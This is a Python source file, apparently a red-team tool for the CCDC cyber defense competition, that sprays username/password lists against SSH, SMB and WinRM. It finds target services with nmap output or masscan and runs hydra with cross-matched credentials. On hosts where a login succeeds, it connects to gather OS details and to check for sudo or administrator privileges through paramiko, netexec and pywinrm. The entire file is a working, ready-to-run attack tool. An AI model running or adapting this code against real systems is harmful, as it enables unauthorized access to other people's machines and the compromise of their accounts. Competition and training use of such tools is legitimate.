#!/usr/bin/env python3
"""
cred_spray.py -- CCDC credential spray tool (hydra-powered)

Usage:
  python3 scripts/cred_spray.py --hosts ips.txt --creds creds.csv
  python3 scripts/cred_spray.py --hosts ips.txt --creds creds.csv --swap
  python3 scripts/cred_spray.py --hosts ips.txt --creds creds.csv --recon-dir output/...

Creds file: CSV with user,password per line (comma or colon separated)
Hosts file: one IP per line

Service-aware targeting:
  --recon-dir parses nmap XML for service names (catches non-standard ports).
  Falls back to network_map.txt port numbers, then masscan probe.

Requires: hydra (thc-hydra)
Optional: masscan, netexec/crackmapexec, paramiko, pywinrm
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

LOCK = threading.Lock()
OUTPUT_DIR = Path(__file__).resolve().parent.parent / "output"
LOCAL_BIN = Path(__file__).resolve().parent.parent / ".local" / "bin"
INSTALL_SCRIPT = Path(__file__).resolve().parent / "install_deps.sh"

STD_PORTS = {"ssh": 22, "smb": 445, "winrm": 5985}
PROBE_PORTS = ",".join(str(p) for p in STD_PORTS.values())

# Nmap service name -> spray protocol
SERVICE_MAP = {
    "ssh": "ssh",
    "microsoft-ds": "smb",
    "netbios-ssn": "smb",
    "wsman": "winrm",
}

# {protocol: {port: [hosts]}}
SprayTargets = dict[str, dict[int, list[str]]]


def _find_bin(name: str) -> str | None:
    local = LOCAL_BIN / name
    if local.is_file() and os.access(local, os.X_OK):
        return str(local)
    return shutil.which(name)


def _run_install_deps() -> bool:
    """Run install_deps.sh to install missing dependencies."""
    if not INSTALL_SCRIPT.is_file():
        return False
    print(f"\n[*] Running {INSTALL_SCRIPT} to install missing tools...")
    try:
        subprocess.run(["bash", str(INSTALL_SCRIPT)], timeout=600)
        return True
    except subprocess.TimeoutExpired:
        print("    [ERROR] install_deps.sh timed out")
        return False
    except Exception as e:
        print(f"    [ERROR] install_deps.sh failed: {e}")
        return False


def log(msg: str):
    with LOCK:
        print(msg, flush=True)


def port_label(port: int, default: int) -> str:
    return f":{port}" if port != default else ""


# -- I/O helpers ---------------------------------------------------------------


def load_creds(path: str) -> list[tuple[str, str]]:
    """Load user,password pairs (comma or colon separated)."""
    pairs = []
    for line in Path(path).read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        sep = "," if "," in line else (":" if ":" in line else None)
        if sep is None:
            continue
        u, p = line.split(sep, 1)
        pairs.append((u.strip(), p.strip()))
    return pairs


def swap_creds(pairs: list[tuple[str, str]]) -> list[tuple[str, str]]:
    """Cross-match: each user x every password."""
    users = list(dict.fromkeys(u for u, _ in pairs))
    passwords = list(dict.fromkeys(p for _, p in pairs))
    existing = set(pairs)
    return pairs + [(u, p) for u in users for p in passwords if (u, p) not in existing]


def load_hosts(path: str) -> list[str]:
    return [
        l.strip()
        for l in Path(path).read_text().splitlines()
        if l.strip() and not l.startswith("#")
    ]


# -- Service discovery ---------------------------------------------------------


def _add_target(targets: SprayTargets, proto: str, port: int, ip: str):
    hosts = targets.setdefault(proto, {}).setdefault(port, [])
    if ip not in hosts:
        hosts.append(ip)


def parse_nmap_services(recon_dir: str) -> SprayTargets | None:
    """Parse nmap XML files for service-based targeting."""
    xml_files = sorted(Path(recon_dir).glob("nmap_*.xml"))
    if not xml_files:
        return None

    targets: SprayTargets = {}
    for xml_file in xml_files:
        try:
            tree = ET.parse(xml_file)
        except ET.ParseError as e:
            log(f"  [!] Failed to parse {xml_file.name}: {e}")
            continue

        for host_el in tree.findall(".//host"):
            addr_el = host_el.find("address[@addrtype='ipv4']")
            if addr_el is None:
                continue
            ip = addr_el.get("addr", "")
            if not ip:
                continue

            for port_el in host_el.findall(".//port"):
                state_el = port_el.find("state")
                if state_el is None or state_el.get("state") != "open":
                    continue
                port = int(port_el.get("portid", "0"))
                svc_el = port_el.find("service")
                if svc_el is None:
                    continue

                proto = SERVICE_MAP.get(svc_el.get("name", ""))
                if proto is None and port in (5985, 5986):
                    proto = "winrm"
                if proto:
                    _add_target(targets, proto, port, ip)

    return targets or None


def parse_recon_network_map(recon_dir: str) -> SprayTargets:
    """Fallback: parse network_map.txt (standard ports only)."""
    nmap_path = Path(recon_dir) / "network_map.txt"
    if not nmap_path.exists():
        log(f"  [!] {nmap_path} not found")
        return {}

    targets: SprayTargets = {}
    port_to_proto = {v: k for k, v in STD_PORTS.items()}
    pattern = re.compile(r"^\|\s+([\d.]+)\s+ports:\s+([\d,]+)")

    for line in nmap_path.read_text().splitlines():
        m = pattern.match(line)
        if not m:
            continue
        ip = m.group(1)
        ports = {int(p) for p in m.group(2).split(",")}
        for port, proto in port_to_proto.items():
            if port in ports:
                _add_target(targets, proto, port, ip)
    return targets


def run_port_probe(hosts: list[str], rate: int = 10000) -> SprayTargets:
    """Quick masscan SYN probe on standard SSH/SMB/WinRM ports."""
    masscan_bin = _find_bin("masscan")
    all_open: SprayTargets = {p: {v: list(hosts)} for p, v in STD_PORTS.items()}

    if not masscan_bin:
        log("  [!] masscan not found -- spraying all protocols on all hosts")
        return all_open

    log(f"[*] Port probe: {len(hosts)} hosts x 3 ports (22, 445, 5985)")
    start = time.time()

    tmp_file = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
    tmp_file.write("\n".join(hosts) + "\n")
    tmp_file.close()

    cmd = [
        masscan_bin,
        "-iL",
        tmp_file.name,
        "-p",
        PROBE_PORTS,
        f"--rate={rate}",
        "-oL",
        "-",
        "--wait=2",
    ]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    except subprocess.TimeoutExpired:
        log("  [!] Port probe timed out")
        return all_open
    finally:
        try:
            os.unlink(tmp_file.name)
        except OSError:
            pass

    port_to_proto = {v: k for k, v in STD_PORTS.items()}
    targets: SprayTargets = {}
    for line in proc.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 4 and parts[0] == "open":
            port, ip = int(parts[2]), parts[3]
            proto = port_to_proto.get(port)
            if proto:
                _add_target(targets, proto, port, ip)

    elapsed = time.time() - start
    counts = {p: len(targets.get(p, {}).get(v, [])) for p, v in STD_PORTS.items()}
    log(
        f"    SSH={counts['ssh']}, SMB={counts['smb']}, WinRM={counts['winrm']}  "
        f"({elapsed:.0f}s)"
    )
    return targets


def filter_targets(targets: SprayTargets, allowed: set[str]) -> SprayTargets:
    """Keep only hosts present in the allowed set, prune empty groups."""
    result: SprayTargets = {}
    for proto, port_groups in targets.items():
        for port, hosts in port_groups.items():
            filtered = [ip for ip in hosts if ip in allowed]
            if filtered:
                result.setdefault(proto, {})[port] = filtered
    return result


def log_targets_summary(targets: SprayTargets):
    for proto in ("ssh", "smb", "winrm"):
        groups = targets.get(proto, {})
        total = sum(len(h) for h in groups.values())
        if not groups:
            log(f"    {proto.upper()} targets: 0")
        elif len(groups) == 1:
            log(f"    {proto.upper()} targets: {total} (port {next(iter(groups))})")
        else:
            detail = ", ".join(f":{p}({len(h)})" for p, h in sorted(groups.items()))
            log(f"    {proto.upper()} targets: {total}  [{detail}]")


# -- Live results file ---------------------------------------------------------


def _format_entry(ip: str, r: dict) -> str:
    parts = [f"{r['user']},{r['password']} (success"]
    if r.get("os_info") and r["os_info"] != "unknown":
        parts.append(f", {r['platform']} [{r['os_info']}]")
    if r.get("admin"):
        parts.append(f", {'sudo' if r['platform'] == 'linux' else 'admin'}")
    parts.append(")")
    return f"{ip}  {''.join(parts)}"


class LiveResults:
    """Thread-safe incremental result writer (tail -f friendly)."""

    def __init__(self, out_file: Path):
        self.out_file = out_file
        self.out_file.parent.mkdir(parents=True, exist_ok=True)
        self.out_file.write_text("")
        self._lock = threading.Lock()
        self._results: dict[str, list[dict]] = {}

    def add(self, ip: str, entry: dict):
        with self._lock:
            self._results.setdefault(ip, []).append(entry)
            with open(self.out_file, "a") as f:
                f.write(_format_entry(ip, entry) + "\n")

    @property
    def results(self) -> dict[str, list[dict]]:
        with self._lock:
            return dict(self._results)

    def write_final_report(self):
        with self._lock:
            lines = []
            for ip in sorted(
                self._results, key=lambda x: tuple(int(o) for o in x.split("."))
            ):
                lines.append(ip)
                for r in self._results[ip]:
                    lines.append(f"  {_format_entry(ip, r).split('  ', 1)[1]}")
                lines.append("")
            self.out_file.write_text("\n".join(lines))


# -- Hydra spray ---------------------------------------------------------------


def run_hydra(
    service: str,
    hosts_file: Path,
    creds_file: Path,
    output_file: Path,
    port: int | None = None,
    tasks_per_host: int | None = None,
    tasks_total: int | None = None,
    stop_first: bool = False,
    timeout: int = 300,
) -> list[dict]:
    """Run hydra, streaming status lines live. Returns confirmed creds."""
    hydra_bin = _find_bin("hydra") or "hydra"
    cmd = [
        hydra_bin,
        "-C",
        str(creds_file),
        "-M",
        str(hosts_file),
        "-o",
        str(output_file),
        "-b",
        "json",
        "-I",
    ]
    if port is not None:
        cmd.extend(["-s", str(port)])
    if tasks_per_host is not None:
        cmd.extend(["-t", str(tasks_per_host)])
    if tasks_total is not None:
        cmd.extend(["-T", str(tasks_total)])
    if stop_first:
        cmd.append("-f")
    cmd.append(service)

    host_count = sum(1 for _ in open(hosts_file))
    plabel = f":{port}" if port else ""
    log(f"  hydra {service}{plabel} -> {host_count} hosts")
    start = time.time()

    SHOW_KEYWORDS = (
        "[status]",
        "[data]",
        "[error]",
        "[warning]",
        "host:",
        "login:",
        "password:",
        "successfully completed",
        "valid password",
    )
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        for line in proc.stdout:
            stripped = line.rstrip()
            if stripped and any(k in stripped.lower() for k in SHOW_KEYWORDS):
                log(f"    {stripped}")
        proc.wait(timeout=timeout)
        if proc.returncode not in (0, 1, 255):
            log(f"  [!] hydra {service}{plabel} exited {proc.returncode}")
    except subprocess.TimeoutExpired:
        proc.kill()
        log(f"  [!] hydra {service}{plabel} timed out after {timeout}s")
    except FileNotFoundError:
        log("[!] hydra not found -- install thc-hydra")
        sys.exit(1)

    results = _parse_hydra_json(output_file)
    elapsed = time.time() - start
    log(
        f"  {service}{plabel}: {len(results)} creds on "
        f"{len({r['host'] for r in results})} hosts  ({elapsed:.0f}s)"
    )
    return results


def _parse_hydra_json(path: Path) -> list[dict]:
    if not path.exists():
        return []
    try:
        data = json.loads(path.read_text())
        return [
            {
                "host": e.get("host", ""),
                "port": e.get("port", 0),
                "login": e.get("login", ""),
                "password": e.get("password", ""),
                "service": e.get("service", ""),
            }
            for e in data.get("results", [])
        ]
    except (json.JSONDecodeError, KeyError) as e:
        log(f"  [!] Failed to parse hydra output: {e}")
        return []


def spray_protocol(
    proto: str,
    targets: SprayTargets,
    tmp: Path,
    creds_path: Path,
    args: argparse.Namespace,
    skip_ips: set[str] | None = None,
) -> list[dict]:
    """Run hydra for all port groups of a protocol. Returns all hits."""
    groups = targets.get(proto, {})
    if not groups:
        return []

    # Filter out already-hit hosts if requested
    if skip_ips:
        groups = {
            p: [ip for ip in hosts if ip not in skip_ips] for p, hosts in groups.items()
        }
        groups = {p: h for p, h in groups.items() if h}
    if not groups:
        return []

    total = sum(len(h) for h in groups.values())
    log(f"\n[*] Hydra {proto.upper()} spray ({total} hosts)")

    std = STD_PORTS[proto]
    all_hits: list[dict] = []
    for port, port_hosts in sorted(groups.items()):
        hosts_path = tmp / f"{proto}_{port}_hosts.txt"
        hosts_path.write_text("\n".join(port_hosts) + "\n")
        hits = run_hydra(
            service=proto,
            hosts_file=hosts_path,
            creds_file=creds_path,
            output_file=tmp / f"hydra_{proto}_{port}.json",
            port=port if port != std else None,
            tasks_per_host=args.threads,
            tasks_total=args.threads_all,
            stop_first=args.stop_first,
            timeout=args.timeout,
        )
        all_hits.extend(hits)
    return all_hits


# -- Post-auth info gathering ---------------------------------------------------


def ssh_post_auth(ip: str, user: str, passwd: str, port: int = 22) -> dict:
    """SSH in with confirmed creds, gather OS info and sudo status."""
    try:
        import paramiko
    except ImportError:
        return {"os_info": "unknown", "admin": False, "platform": "linux"}

    info: dict = {"os_info": "unknown", "admin": False, "platform": "linux"}
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def _exec(cmd: str) -> str:
        _, out, _ = client.exec_command(cmd, timeout=5)
        return out.read().decode(errors="replace")

    try:
        client.connect(
            ip,
            port=port,
            username=user,
            password=passwd,
            timeout=8,
            auth_timeout=8,
            banner_timeout=8,
            look_for_keys=False,
            allow_agent=False,
        )

        # OS info
        try:
            raw = _exec("cat /etc/os-release 2>/dev/null | head -2 || uname -a").strip()
            for line in raw.splitlines():
                if line.startswith("PRETTY_NAME="):
                    info["os_info"] = line.split("=", 1)[1].strip('"')
                    break
            if info["os_info"] == "unknown" and raw:
                info["os_info"] = raw.splitlines()[0]
        except Exception:
            pass

        # Privilege check
        try:
            id_out = _exec("id")
            if "uid=0" in id_out:
                info["admin"] = True
            elif any(g in id_out for g in ("sudo", "wheel", "adm", "root", "admin")):
                info["admin"] = True
        except Exception:
            pass

        if not info["admin"]:
            try:
                sudo_out = _exec("sudo -ln 2>/dev/null")
                if "may run" in sudo_out.lower() or "(ALL)" in sudo_out:
                    info["admin"] = True
            except Exception:
                pass
    except Exception:
        pass
    finally:
        try:
            client.close()
        except Exception:
            pass
    return info


def smb_post_auth(ip: str, user: str, passwd: str) -> dict:
    """Check SMB admin status and OS info via netexec/crackmapexec."""
    tool = (
        _find_bin("nxc")
        or _find_bin("netexec")
        or _find_bin("crackmapexec")
        or _find_bin("cme")
    )
    info: dict = {"os_info": "windows", "admin": False, "platform": "windows"}
    if not tool:
        return info

    try:
        r = subprocess.run(
            [tool, "smb", ip, "-u", user, "-p", passwd, "--no-bruteforce"],
            capture_output=True,
            text=True,
            timeout=15,
        )
        if "(Pwn3d!)" in r.stdout + r.stderr:
            info["admin"] = True
        for line in r.stdout.splitlines():
            if "windows" in line.lower():
                idx = line.lower().index("windows")
                info["os_info"] = line[idx:].split("]")[0].split("(")[0].strip()
                break
    except Exception:
        pass
    return info


def gather_info(ssh_hits: list[dict], smb_hits: list[dict], live: LiveResults):
    """Post-auth info gathering on confirmed creds, results written live."""
    total = len(ssh_hits) + len(smb_hits)
    counter = {"n": 0}
    counter_lock = threading.Lock()

    def process(hit: dict, proto: str):
        ip, port = hit["host"], hit.get("port", STD_PORTS.get(proto, 0))
        if proto == "ssh":
            info = ssh_post_auth(ip, hit["login"], hit["password"], port=port)
        else:
            info = smb_post_auth(ip, hit["login"], hit["password"])
        live.add(
            ip,
            {
                "user": hit["login"],
                "password": hit["password"],
                "success": True,
                **info,
            },
        )
        with counter_lock:
            counter["n"] += 1
            n = counter["n"]
        priv = (
            ", sudo"
            if info["admin"] and proto == "ssh"
            else (", admin" if info["admin"] else "")
        )
        plabel = port_label(port, STD_PORTS.get(proto, 0))
        log(
            f"  [{n}/{total}] {ip}{plabel} -- {hit['login']},{hit['password']} "
            f"({proto}, {info['platform']} [{info['os_info']}]{priv})"
        )

    with ThreadPoolExecutor(max_workers=10) as pool:
        futures = [pool.submit(process, h, "ssh") for h in ssh_hits]
        futures += [pool.submit(process, h, "smb") for h in smb_hits]
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                log(f"  [!] Info gather error: {e}")


# -- WinRM fallback ------------------------------------------------------------


def spray_winrm(ip: str, creds: list[tuple[str, str]], port: int = 5985) -> list[dict]:
    """Spray WinRM via pywinrm. Returns results for this host."""
    try:
        import winrm
    except ImportError:
        return []

    results = []
    for user, passwd in creds:
        try:
            session = winrm.Session(
                f"http://{ip}:{port}/wsman",
                auth=(user, passwd),
                transport="ntlm",
                server_cert_validation="ignore",
                operation_timeout_sec=8,
                read_timeout_sec=10,
            )
            r = session.run_cmd("whoami /priv")
            if r.status_code != 0 and not r.std_out:
                continue

            priv_out = r.std_out.decode(errors="replace")

            # OS version
            try:
                ver = session.run_cmd("ver")
                ver_out = ver.std_out.decode(errors="replace").strip()
                host_os = ver_out.splitlines()[0] if ver_out else "windows"
            except Exception:
                host_os = "windows"

            # Admin check
            is_admin = False
            try:
                ga = session.run_cmd("whoami /groups")
                groups = ga.std_out.decode(errors="replace")
                is_admin = "S-1-5-32-544" in groups or "High Mandatory Level" in groups
            except Exception:
                pass
            if not is_admin:
                is_admin = (
                    "SeDebugPrivilege" in priv_out
                    or "SeTakeOwnershipPrivilege" in priv_out
                )

            entry = {
                "user": user,
                "password": passwd,
                "success": True,
                "os_info": host_os,
                "platform": "windows",
                "admin": is_admin,
            }
            results.append(entry)
            plabel = port_label(port, 5985)
            atag = ", admin" if is_admin else ""
            log(
                f"  [+] {ip}{plabel} -- {user},{passwd} "
                f"(winrm, windows [{host_os}]{atag})"
            )

        except Exception as e:
            err = str(e).lower()
            if "401" in err or "unauthorized" in err:
                continue
            if any(
                x in err for x in ("timed out", "refused", "unreachable", "max retries")
            ):
                break
            continue
    return results


def run_winrm_fallback(
    targets: SprayTargets, creds: list[tuple[str, str]], live: LiveResults
):
    """WinRM spray on hosts with port open but no results yet."""
    existing = live.results
    work = [
        (ip, port)
        for port, hosts in sorted(targets.get("winrm", {}).items())
        for ip in hosts
        if ip not in existing
    ]
    if not work:
        return

    log(f"\n[*] WinRM fallback: {len(work)} hosts")
    total = len(work)
    counter = {"n": 0}
    counter_lock = threading.Lock()

    def do_host(ip: str, port: int):
        hits = spray_winrm(ip, creds, port=port)
        for entry in hits:
            live.add(ip, entry)
        with counter_lock:
            counter["n"] += 1
        if not hits:
            log(
                f"  [{counter['n']}/{total}] {ip}{port_label(port, 5985)} "
                f"-- no WinRM creds"
            )

    with ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(do_host, ip, port): ip for ip, port in work}
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                log(f"  [!] WinRM error: {e}")


# -- Main ----------------------------------------------------------------------


def main():
    parser = argparse.ArgumentParser(
        description="CCDC credential spray (hydra-powered)"
    )
    parser.add_argument("--hosts", required=True, help="File with one IP per line")
    parser.add_argument(
        "--creds", required=True, help="CSV file: user,password per line"
    )
    parser.add_argument(
        "--swap", action="store_true", help="Cross-match: each user x every password"
    )
    parser.add_argument(
        "--recon-dir", help="Recon output dir (parses nmap XML for service targeting)"
    )
    parser.add_argument(
        "--threads", type=int, default=None, help="Hydra tasks per host (default: 16)"
    )
    parser.add_argument(
        "--threads-all",
        type=int,
        default=None,
        help="Hydra total parallel tasks (default: 64)",
    )
    parser.add_argument(
        "--stop-first",
        action="store_true",
        help="Stop after first valid cred per host (hydra -f)",
    )
    parser.add_argument("--no-winrm", action="store_true", help="Skip WinRM fallback")
    parser.add_argument(
        "--timeout",
        type=int,
        default=300,
        help="Hydra timeout per protocol in seconds (default: 300)",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Output file (default: output/spray_TIMESTAMP/results.txt)",
    )
    args = parser.parse_args()

    if not _find_bin("hydra"):
        print("[!] hydra not found. Attempting auto-install...")
        if _run_install_deps() and _find_bin("hydra"):
            pass  # installed successfully
        else:
            print(
                "[!] hydra still not found. Run: sudo bash scripts/install_deps.sh",
                file=sys.stderr,
            )
            sys.exit(1)
    if OUTPUT_DIR.exists() and not os.access(OUTPUT_DIR, os.W_OK):
        print(
            f"[!] Cannot write to {OUTPUT_DIR}/ (owned by root)\n"
            f"    Fix: sudo chown -R $(id -u):$(id -g) {OUTPUT_DIR}",
            file=sys.stderr,
        )
        sys.exit(1)

    hosts = load_hosts(args.hosts)
    creds = load_creds(args.creds)
    if not hosts:
        print("No hosts loaded.", file=sys.stderr)
        sys.exit(1)
    if not creds:
        print("No credentials loaded.", file=sys.stderr)
        sys.exit(1)

    if args.swap:
        orig = len(creds)
        creds = swap_creds(creds)
        log(f"[*] Swap mode: {orig} original -> {len(creds)} total (cross-matched)")

    log(f"[*] {len(hosts)} hosts, {len(creds)} credential pairs")
    if args.threads or args.threads_all:
        parts = []
        if args.threads:
            parts.append(f"{args.threads} tasks/host")
        if args.threads_all:
            parts.append(f"{args.threads_all} total")
        log(f"[*] Hydra: {', '.join(parts)}")
    else:
        log("[*] Hydra: default parallelism (16/host, 64 total)")

    # -- Output setup ----------------------------------------------------------

    if args.output:
        out_file = Path(args.output)
    else:
        out_dir = OUTPUT_DIR / f"spray_{datetime.now():%Y%m%d_%H%M%S}"
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / "results.txt"

    live = LiveResults(out_file)
    log(f"[*] Output: {out_file}  (tail -f to watch)")

    # -- Phase 1: Service discovery --------------------------------------------

    log("\n[*] Phase 1 -- Service discovery")
    if args.recon_dir:
        log(f"  Using recon data from {args.recon_dir}")
        targets = parse_nmap_services(args.recon_dir)
        if targets:
            log("  Parsed nmap XML (service-based targeting)")
        else:
            log("  No nmap XML found, trying network_map.txt")
            targets = parse_recon_network_map(args.recon_dir)
        if not targets:
            log("  [!] No port data found, falling back to probe")
            targets = run_port_probe(hosts)
    else:
        targets = run_port_probe(hosts)

    targets = filter_targets(targets, set(hosts))
    log_targets_summary(targets)

    # -- Temp dir for hydra files ----------------------------------------------

    tmp = Path(tempfile.mkdtemp(prefix="cred_spray_"))
    creds_path = tmp / "creds.txt"
    creds_path.write_text("\n".join(f"{u}:{p}" for u, p in creds) + "\n")

    # -- Phase 2: SSH spray ----------------------------------------------------

    ssh_hits = spray_protocol("ssh", targets, tmp, creds_path, args)
    if not targets.get("ssh"):
        log("\n[*] Skipping SSH (no targets)")

    # -- Phase 3: SMB spray ----------------------------------------------------

    skip_ips = {h["host"] for h in ssh_hits} if args.stop_first else None
    smb_hits = spray_protocol("smb", targets, tmp, creds_path, args, skip_ips=skip_ips)
    if not targets.get("smb"):
        log("\n[*] Skipping SMB (no targets)")

    # -- Post-auth info gathering ----------------------------------------------

    total_hits = len(ssh_hits) + len(smb_hits)
    if total_hits:
        log(f"\n[*] Post-auth info gathering ({total_hits} confirmed creds)")
        gather_info(ssh_hits, smb_hits, live)
    else:
        log("\n[*] No creds found via SSH/SMB")

    # -- WinRM fallback --------------------------------------------------------

    if not args.no_winrm and targets.get("winrm"):
        run_winrm_fallback(targets, creds, live)
    elif not args.no_winrm and not targets.get("winrm"):
        log("\n[*] Skipping WinRM (no targets)")

    # -- Final report ----------------------------------------------------------

    live.write_final_report()
    all_results = live.results

    log(f"\n{'=' * 50}")
    log(f"Results: {len(all_results)}/{len(hosts)} hosts with valid creds")
    admin_count = sum(
        1 for hits in all_results.values() if any(e.get("admin") for e in hits)
    )
    log(f"Admin/sudo access: {admin_count} hosts")
    log(f"Output: {out_file}")
    log(f"{'=' * 50}")

    if all_results:
        log("")
        log(out_file.read_text())

    shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    main()
